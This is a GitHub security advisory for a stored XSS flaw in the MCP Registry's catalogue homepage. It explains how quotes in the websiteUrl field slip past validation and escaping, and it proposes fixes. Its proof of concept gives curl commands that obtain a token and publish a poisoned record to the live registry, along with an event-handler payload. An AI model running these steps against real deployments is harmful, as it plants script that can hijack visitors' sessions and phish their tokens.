# [M] MCP Registry vulnerable to stored XSS in catalogue UI via attribute-quote breakout in publisher-controlled `websiteUrl`

## Summary
Severity: Medium
Advisory: GHSA-rqv2-m695-f8j4
CVE: CVE-2026-44429
CWE: CWE-116, CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-rqv2-m695-f8j4
Type: github-advisory

## Affected
- Go: `github.com/modelcontextprotocol/registry` — affected >=0 <1.7.7

## Details
## Summary

The public catalogue UI served at `GET /` (file `internal/api/handlers/v0/ui_index.html`) is vulnerable to stored cross-site scripting via the `server.websiteUrl` field of any published `server.json`. Server-side validation in `internal/validators/validators.go` (`validateWebsiteURL`) only checks that the URL parses, is absolute, and uses the `https` scheme; it does not reject quote characters. Client-side, the value is interpolated into a double-quoted `href` attribute via `innerHTML`, using a homegrown `escapeHtml` helper that performs the standard `textContent` → `innerHTML` round-trip. Per the HTML serialisation algorithm, that round-trip encodes only `&`, `<`, `>` and U+00A0 inside text nodes — it does **not** encode `"` or `'`. A literal `"` in `websiteUrl` therefore breaks out of the `href` attribute, allowing arbitrary `on*` event handlers to be appended to the same `<a>` element. The Content-Security-Policy on `/` is `script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com`, so the injected event handlers execute.

Any user able to obtain a publish token (e.g. via `POST /v0/auth/github-at` with their own GitHub account, or `POST /v0/auth/none` on a deployment that has anonymous auth enabled) can plant a poisoned record visible to every visitor of the registry homepage.

## Affected component

- Validator: `internal/validators/validators.go` — `validateWebsiteURL` (lines 153–199)
- Sink: `internal/api/handlers/v0/ui_index.html` — `toggleDetails(card, item)` at line 432, the `href` attribute built around `escapeHtml(server.websiteUrl)`
- Helper: `escapeHtml` defined at `internal/api/handlers/v0/ui_index.html` lines 494–498

## Proof of concept

1. Obtain a Registry JWT for any namespace you control (a GitHub OAuth exchange against a throwaway account suffices):

   ```bash
   TOKEN=$(curl -sS -X POST https://registry.modelcontextprotocol.io/v0/auth/github-at \
        -H 'Content-Type: application/json' \
        -d '{"github_token":"<gh-pat>"}' | jq -r .registry_token)
   ```

2. Publish a server with a poisoned `websiteUrl`. The literal `"` is preserved end-to-end:

   ```bash
   curl -sS -X POST https://registry.modelcontextprotocol.io/v0/publish \
     -H "Authorization: Bearer $TOKEN" \
     -H 'Content-Type: application/json' \
     --data-binary @- <<'EOF'
   {
     "$schema": "https://static.modelcontextprotocol.io/schemas/2025-09-29/server.schema.json",
     "name":  "io.github.<your-account>/xss-poc",
     "version": "0.0.1",
     "description": "hover the website link",
     "websiteUrl": "https://example.com/\"onmouseover=alert(document.domain)//"
   }
   EOF
   ```

3. Visit `https://registry.modelcontextprotocol.io/`, search for `xss-poc`, click the card to expand it, then hover the **Website** link in the details panel. The injected `onmouseover` fires and `alert(document.domain)` runs on the `registry.modelcontextprotocol.io` origin.

## Why server-side validation does not catch this

Go's `net/url.Parse` accepts literal `"` in the path component:

```
input="https://example.com/\"onmouseover=alert(1)//"  IsAbs=true  Scheme="https"  Path="/\"onmouseover=alert(1)//"
```

Neither the Huma `format:"uri"` annotation nor `validateWebsiteURL`'s scheme/`IsAbs` triplet rejects this string. The architecture's existing protection — `repository.url` is regex-locked to `^https?://(www\.)?github\.com/[\w.-]+/[\w.-]+/?$` and therefore cannot contain quotes — does not extend to `websiteUrl`, which has no allowlist.

## Why client-side `escapeHtml` does not catch this

```js
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
```

Per the HTML5 spec (§13.3 Serialising HTML fragments), the only characters encoded inside the text content of an element are `&`, `<`, `>`, and U+00A0. `"` and `'` are **not** encoded because in a text-content context they are not special. The helper is therefore safe in element-text contexts (where it is correctly used for `name`, `version`, `description`, etc.) but unsafe inside an attribute value, which is precisely where it is invoked for `href` on lines 432 and 426.

## Impact

- Stored XSS on the official MCP Registry homepage. The malicious entry sits in the public catalogue alongside legitimate ones; any user expanding the entry triggers the payload.
- Because the page is served on the official `registry.modelcontextprotocol.io` origin, the injected script can:
  - Read and overwrite `localStorage` (`baseUrl`, `customUrl`), pinning the user's subsequent reads to an attacker-controlled "Custom" base URL.
  - Issue any same-origin or cross-origin XHR (`connect-src *` is granted).
  - Phish for Registry JWTs by injecting fake auth flows on the trusted origin.
- The CSP `script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com` does not block this because `'unsafe-inline'` permits inline event-handler attributes.

## Suggested remediation (any one suffices)

1. Replace the homegrown `escapeHtml` with an attribute-safe encoder that also escapes `"`, `'`, backtick, and `=` — the OWASP HTML attribute-encoding rule.
2. Avoid building the `href` via string templates. Use `setAttribute('href', value)` instead — `setAttribute` is not subject to HTML tokenisation, so no breakout is possible.
3. Tighten `validateWebsiteURL` to reject any URL whose raw bytes contain `"`, `'`, `<`, `>`, ` `, `\t`, or `\n`, or — conservatively — store the canonical re-serialised form (`parsedURL.String()` percent-encodes such characters in the path).
4. Drop `'unsafe-inline'` from `script-src` after auditing the inline scripts on the page.

Approach (3) is the smallest server-side change and immediately neutralises the exploit for any new publishes; approaches (1) or (2) close the class of bug at the sink so future fields with similar patterns are safe by default.

## References
- https://github.com/modelcontextprotocol/registry/security/advisories/GHSA-rqv2-m695-f8j4
- https://nvd.nist.gov/vuln/detail/CVE-2026-44429
- https://github.com/modelcontextprotocol/registry/pull/1249
- https://github.com/modelcontextprotocol/registry/commit/78b7bbde07948049b916d76b4769faee461ff930
- https://github.com/modelcontextprotocol/registry
- https://github.com/modelcontextprotocol/registry/releases/tag/v1.7.7
